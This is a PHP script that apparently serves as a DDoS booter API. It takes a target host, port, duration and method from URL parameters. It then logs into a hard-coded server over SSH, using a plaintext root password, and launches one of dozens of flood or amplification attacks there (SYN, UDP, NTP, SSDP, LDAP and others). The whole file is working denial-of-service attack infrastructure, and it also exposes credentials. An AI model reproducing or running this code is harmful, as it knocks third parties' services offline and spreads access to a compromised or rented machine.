<?php
if (!function_exists('ssh2_connect'))
{
        die("Install ssh2 module.\n");
}



if (isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {
    
        $SERVERS = array(
                "185.16.37.156"       =>      array("root", "13121312")
        );
        $port = (int)$_GET['port'] > 0 && (int)$_GET['port'] < 65536 ? $_GET['port'] : 80;
        $port = preg_replace('/\D/', '', $port);
        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();
        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*60) ? (int)$_GET['time'] : 30;
        $time = preg_replace('/\D/', '', $time);
        $domain = $_GET['host'];
        if(!filter_var($domain, FILTER_VALIDATE_URL) && !filter_var($domain, FILTER_VALIDATE_IP))
        {
            die("Invalid Domain");
        }
        $smIP = str_replace(".", "", $ip);
        $smDomain = str_replace(".", "", $domain);
        $smDomain = str_replace("http://", "", $smDomain);

	    if($_GET['method'] == "POWER-UDP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/udp/PowerTime {$ip} {$port} 900 10 -500 {$time}"; }
        elseif($_GET['method'] == "OVH-UDP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/udp/ovhudp2 {$ip} {$port} 501 10 -1 {$time}"; }
        elseif($_GET['method'] == "TS3-DROPER") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/udp/ts3droper {$ip} {$port} 10 -1 {$time} 0"; }
        elseif($_GET['method'] == "NFO-UDP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/nfo -U -h {$ip} -p {$port},{$port} -t {$time}"; }
        elseif($_GET['method'] == "NFO-TCP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/nfo -T0 -h {$ip} -p {$port},{$port} -t {$time}"; }
        elseif($_GET['method'] == "VALVE") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/udp/valve {$ip} {$port} 10 {$time}"; }
        elseif($_GET['method'] == "KGB") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/KGB {$ip} {$port} 10 -1 {$time} 900 0 1"; }
        elseif($_GET['method'] == "VOX-BYPASS") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/voxbypass {$ip} 10 -1 {$time}"; }
	    elseif($_GET['method'] == "TCP-BYPASS") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/tcpbypass {$ip} {$port} 10 -1 {$time}"; }
	    elseif($_GET['method'] == "TCP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/tcp {$ip} {$port} 10 -1 {$time}"; }
	    elseif($_GET['method'] == "TCP-FIN") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/tcp-fin {$ip} 10 -1 {$time}"; }
	    elseif($_GET['method'] == "TCP-RST") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/tcp-rst {$ip} 10 -1 {$time}"; }
	    elseif($_GET['method'] == "TCP-XMAS") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/tcp-xmas {$ip} 10 -1 {$time}"; }
		elseif($_GET['method'] == "WIZARD") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/wizard {$ip} {$port} 10 -1 {$time}"; }
		elseif($_GET['method'] == "ZAP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/zap {$ip} {$port} 10 -1 {$time}"; }
		elseif($_GET['method'] == "DOMINATE") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/dominate {$ip} {$port} 10 -1 {$time}"; }
		elseif($_GET['method'] == "SSYN") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/ssyn {$ip} {$port} 10 -1 {$time}"; }
	    elseif($_GET['method'] == "TCP-ACK") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/tcp-ack {$ip} 10 -1 {$time}"; }
	    elseif($_GET['method'] == "TCP-PSH") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/tcp-psh {$ip} 10 -1 {$time}"; }
		elseif($_GET['method'] == "TCP-SE") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/tcp-se {$ip} {$port} 10 -1 {$time}"; }
		elseif($_GET['method'] == "XSYN") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/xsyn {$ip} {$port} 10 -1 {$time}"; }
		elseif($_GET['method'] == "ZSYN") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/zsyn {$ip} {$port} 10 -1 {$time}"; }
		elseif($_GET['method'] == "CSYN") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/csyn {$ip} {$port} 10 -1 {$time}"; }
		elseif($_GET['method'] == "ESSYN") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/essyn {$ip} {$port} 10 -1 {$time}"; }
		elseif($_GET['method'] == "UDP-RAND") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/UDP-RAND {$ip} {$port} -1 10 {$time}"; }
		elseif($_GET['method'] == "ABUSE") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/abuse {$ip} {$port} 10 -1 {$time}"; }
		elseif($_GET['method'] == "SAMP") { $command = "screen -dmS {$smIP} timeout {$time} ./phpbotnet_resources/xdmetods/udp/samp {$ip} {$port}"; }
        elseif($_GET['method'] == "ESP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/DevilESP {$ip} 10 -1 {$time}"; }
        elseif($_GET['method'] == "MULTI-TCP-BYPASS") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/syb {$ip} {$port} 10 -1 {$time}"; }
        elseif($_GET['method'] == "ESP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/imperium {$ip} {$port} 10 -1 {$time}"; }
        elseif($_GET['method'] == "XTS3") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/udp/XTS3 {$ip} {$port} 10 -1 {$time}"; }
        elseif($_GET['method'] == "ECN") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/ecn {$ip} {$port} 10 -1 {$time}"; }
        elseif($_GET['method'] == "URG") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/urg {$ip} 10 -1 {$time}"; }
        elseif($_GET['method'] == "ISSYN") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/issyn {$ip} 10 -1 {$time}"; }
        elseif($_GET['method'] == "ACE") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/ace {$ip} 10 -1 {$time}"; }
        elseif($_GET['method'] == "BOGUS") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/bogus {$ip} {$port} 10 -1 {$time}"; }
        elseif($_GET['method'] == "TCP-S") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/stcp {$ip} {$port} 10 -1 {$time} res2"; }
        elseif($_GET['method'] == "TCP-A") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/atcp {$ip} 10 -1 {$time}"; }
        elseif($_GET['method'] == "JUNO") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/juno {$ip} 10 -1 {$time}"; }
        elseif($_GET['method'] == "URG") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/urg {$ip} 10 -1 {$time}"; }
        elseif($_GET['method'] == "FRAG") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/tcp/FRAG {$ip} {$port} 10 -1 {$time}"; }
        elseif($_GET['method'] == "STORM-UDP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/update/stormudp -d {$ip} -p {$port} -z 180 -rs -t {$time}"; }
        elseif($_GET['method'] == "GRENADE") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/update/grenade {$ip} 10 -1 {$time} 0"; }
        elseif($_GET['method'] == "HAVEN") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/update/Haven {$ip} {$port} 10 -1 {$time}"; }
        elseif($_GET['method'] == "TCP-SW") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/update/Sw {$ip} {$port} 10 -1 {$time}"; }
        elseif($_GET['method'] == "VSE") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/udp/vse {$ip} {$port} 10 -1 {$time}"; }

        elseif($_GET['method'] == "AFS") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/amp/afs {$ip} {$port} afs.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "COAP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/amp/coap {$ip} {$port} coap.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "FIVEM") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/amp/fivem {$ip} {$port} fivem.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "SSDP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/amp/ssdp {$ip} {$port} ssdp.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "LDAP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/amp/ldap {$ip} {$port} ldap.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "SNMP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/amp/snmp {$ip} {$port} snmp.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "SOURCE") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/amp/source {$ip} {$port} source.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "NTP") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/amp/ntp {$ip} {$port} ntp.txt 10 -1 {$time}"; }
        elseif($_GET['method'] == "TS3") { $command = "screen -dmS {$smIP} ./phpbotnet_resources/xdmetods/amp/ts3 {$ip} {$port} ts3.txt 10 -1 {$time}"; }

        elseif($_GET['method'] == "STOP") { $command = "screen -X -s {$smIP} quit"; }
        else die();
        foreach ($SERVERS as $server=>$credentials) {
                $disposable = new ssh2($server, $credentials[0], $credentials[1]);
                $disposable->exec($command);
}
}
?>